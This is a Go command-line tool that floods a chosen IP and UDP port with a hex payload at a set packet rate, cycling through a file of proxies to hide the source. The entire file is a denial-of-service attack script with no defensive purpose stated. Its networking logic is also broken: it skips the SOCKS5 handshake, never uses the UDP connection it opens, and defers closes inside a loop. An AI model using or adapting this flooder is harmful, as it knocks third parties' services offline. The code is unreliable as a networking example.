package main

import (
 "bufio"
 "encoding/hex"
 "fmt"
 "net"
 "os"
 "strconv"
 "strings"
 "time"
)

func main() {
 // Check command-line arguments
 if len(os.Args) < 6 {
  fmt.Println("Usage: go run main.go <IP> <UDP Port> <Packets per Second> <UDP Payload Hex> <Proxy File>")
  return
 }

 // Get command-line arguments
 ip := os.Args[1]
 udpPort := os.Args[2]
 packetsPerSecond, err := strconv.Atoi(os.Args[3])
 if err != nil {
  fmt.Println("Invalid value for Packets per Second:", err)
  return
 }
 udpPayloadHex := os.Args[4]
 proxyFile := os.Args[5]

 // Read the proxy file
 proxyList, err := readProxyList(proxyFile)
 if err != nil {
  fmt.Println("Failed to read proxy file:", err)
  return
 }

 // Send payload over UDP using SOCKS5 proxies
 for _, proxy := range proxyList {
  proxyAddr, err := net.ResolveTCPAddr("tcp", proxy)
  if err != nil {
   fmt.Println("Failed to resolve proxy address:", err)
   continue
  }

  // Connect to the proxy
  proxyConn, err := net.DialTCP("tcp", nil, proxyAddr)
  if err != nil {
   fmt.Println("Failed to connect to proxy:", err)
   continue
  }

  fmt.Println("Connected to proxy:", proxyConn.RemoteAddr())

  // Send payload over UDP through the proxy
  udpAddr, err := net.ResolveUDPAddr("udp", ip+":"+udpPort)
  if err != nil {
   fmt.Println("Failed to resolve UDP address:", err)
   continue
  }

  udpConn, err := net.DialUDP("udp", nil, udpAddr)
  if err != nil {
   fmt.Println("Failed to connect to UDP server:", err)
   continue
  }
  defer udpConn.Close()

  // Decode UDP payload from hexadecimal string
  udpPayload, err := hex.DecodeString(udpPayloadHex)
  if err != nil {
   fmt.Println("Failed to decode UDP payload hex string:", err)
   continue
  }

  // Calculate delay between payloads
  delay := time.Second / time.Duration(packetsPerSecond)

  // Start flooding through the proxy
  fmt.Printf("Flooding UDP server via proxy %s with %d packets per second\n", proxy, packetsPerSecond)
  for {
   // Send payload through the proxy
   _, err = proxyConn.Write(udpPayload)
   if err != nil {
    fmt.Println("Failed to send payload through proxy:", err)
    break
   }

   // Check if TCP connection is still open
   err = proxyConn.SetReadDeadline(time.Now())
   if err != nil {
    fmt.Println("Proxy connection closed:", err)
    break
   }

   time.Sleep(delay)
  }

  proxyConn.Close()
 }
}

// Function to read proxy list from a file
func readProxyList(filename string) ([]string, error) {
 file, err := os.Open(filename)
 if err != nil {
  return nil, err
 }
 defer file.Close()

 scanner := bufio.NewScanner(file)
 proxyList := []string{}

 for scanner.Scan() {
  proxy := strings.TrimSpace(scanner.Text())
  if proxy != "" {
   proxyList = append(proxyList, proxy)
  }
 }

 if err := scanner.Err(); err != nil {
  return nil, err
 }

 return proxyList, nil
}